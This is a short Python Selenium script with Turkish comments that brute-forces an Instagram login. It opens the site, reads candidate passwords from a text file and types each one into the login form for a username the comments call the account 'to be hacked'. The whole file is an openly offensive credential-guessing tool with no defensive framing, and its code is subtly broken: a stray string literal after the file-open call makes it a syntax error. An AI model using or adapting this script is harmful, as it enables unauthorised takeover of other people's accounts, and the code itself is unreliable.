from selenium import webdriver
import time

tarayici = webdriver.Firefox()
tarayici.get('https://www.instagram.com/')


#burayakullanıcıhacklenecekadıyazılacak



time.sleep(5)
username = tarayici.find_element_by_name('username')
password = tarayici.find_element_by_name('password')
giris_yap = tarayici.find_element_by_xpath('/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[3]')


dosya = open('/root/Masaüstü/list.txt','r') "<= masaüstüne list.txt dosya oluşturup şifreler koyun"

for satir in dosya:
    username.send_keys('yukarıdayazılankullanıcıadı')
    password.send_keys(satir)
    giris_yap.click()

    time.sleep(2)
    username.clear()
    password.clear()

    print(satir)

dosya.close()
time.sleep(10)
tarayici.close()

